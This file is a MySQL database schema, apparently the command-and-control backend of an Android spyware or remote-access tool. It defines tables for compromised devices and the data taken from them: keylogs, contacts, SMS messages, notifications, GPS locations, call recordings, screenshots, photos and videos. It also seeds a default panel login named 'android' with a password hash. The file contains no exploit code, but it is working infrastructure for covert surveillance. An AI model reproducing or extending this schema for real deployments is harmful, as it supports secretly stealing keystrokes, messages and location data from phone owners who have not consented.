CREATE DATABASE IF NOT EXISTS `cc` 
    CHARACTER SET utf8mb4 
    COLLATE utf8mb4_unicode_ci;

USE `cc`;

-- Table structure for table `CLIENT`
DROP TABLE IF EXISTS `CLIENT`;
CREATE TABLE `CLIENT` (
  `id` int NOT NULL AUTO_INCREMENT,
  `model` varchar(45) NOT NULL,
  `device_id` varchar(45) NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `device_api` int NOT NULL,
  `phone` varchar(45) NOT NULL,
  `web_socket_id` varchar(45) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `CONTACT`
DROP TABLE IF EXISTS `CONTACT`;
CREATE TABLE `CONTACT` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `name` varchar(45) NOT NULL,
  `number` varchar(45) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_CONTACT_1_idx` (`client_id`),
  CONSTRAINT `fk_CONTACT_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `IMAGE`
DROP TABLE IF EXISTS `IMAGE`;
CREATE TABLE `IMAGE` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_IMAGE_1_idx` (`client_id`),
  CONSTRAINT `fk_IMAGE_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `INSTALLED_APP`
DROP TABLE IF EXISTS `INSTALLED_APP`;
CREATE TABLE `INSTALLED_APP` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `package_name` varchar(255) NOT NULL,
  `app_name` varchar(255) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_INSTALLED_APP_1_idx` (`client_id`),
  CONSTRAINT `fk_INSTALLED_APP_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `KEYLOG`
DROP TABLE IF EXISTS `KEYLOG`;
CREATE TABLE `KEYLOG` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `text` mediumtext,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_KEYLOG_1_idx` (`client_id`),
  CONSTRAINT `fk_KEYLOG_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `LOCATION`
DROP TABLE IF EXISTS `LOCATION`;
CREATE TABLE `LOCATION` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `latitude` float NOT NULL,
  `longitude` float NOT NULL,
  `altitude` float NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_LOCATION_1_idx` (`client_id`),
  CONSTRAINT `fk_LOCATION_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `MESSAGE`
DROP TABLE IF EXISTS `MESSAGE`;
CREATE TABLE `MESSAGE` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `sender` varchar(45) NOT NULL,
  `content` varchar(2000) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_MESSAGE_1_idx` (`client_id`),
  CONSTRAINT `fk_MESSAGE_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `NOTIFICATION`
DROP TABLE IF EXISTS `NOTIFICATION`;
CREATE TABLE `NOTIFICATION` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `sender` varchar(255) NOT NULL,
  `content` varchar(2000) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_NOTIFICATION_1_idx` (`client_id`),
  CONSTRAINT `fk_NOTIFICATION_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `RECORDING`
DROP TABLE IF EXISTS `RECORDING`;
CREATE TABLE `RECORDING` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  `number` varchar(45) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_RECORDING_1_idx` (`client_id`),
  CONSTRAINT `fk_RECORDING_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `SCREENSHOT`
DROP TABLE IF EXISTS `SCREENSHOT`;
CREATE TABLE `SCREENSHOT` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int NOT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_SCREENSHOT_1_idx` (`client_id`),
  CONSTRAINT `fk_SCREENSHOT_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Table structure for table `USER`
DROP TABLE IF EXISTS `USER`;
CREATE TABLE `USER` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(45) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Dumping data for table `USER`
INSERT INTO `USER` VALUES (1, 'android', '$2y$10$EosVbPPCw0gmOt.B4.cNmeAWKdqCm1fV.89ID1V6u874eC7UMS0Xa');

-- Table structure for table `VIDEO`
DROP TABLE IF EXISTS `VIDEO`;
CREATE TABLE `VIDEO` (
  `id` int NOT NULL AUTO_INCREMENT,
  `client_id` int DEFAULT NULL,
  `filename` varchar(200) NOT NULL,
  `timestamp` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `fk_VIDEO_1_idx` (`client_id`),
  CONSTRAINT `fk_VIDEO_1` FOREIGN KEY (`client_id`) REFERENCES `CLIENT` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
